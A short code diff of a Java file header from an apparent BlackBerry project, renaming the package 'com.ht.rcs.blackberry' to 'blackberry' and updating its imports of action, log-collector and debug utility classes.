@@ -6,16 +6,16 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import java.util.Vector;
 
-import com.ht.rcs.blackberry.action.Action;
-import com.ht.rcs.blackberry.action.SubAction;
-import com.ht.rcs.blackberry.log.LogCollector;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.action.Action;
+import blackberry.action.SubAction;
+import blackberry.log.LogCollector;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
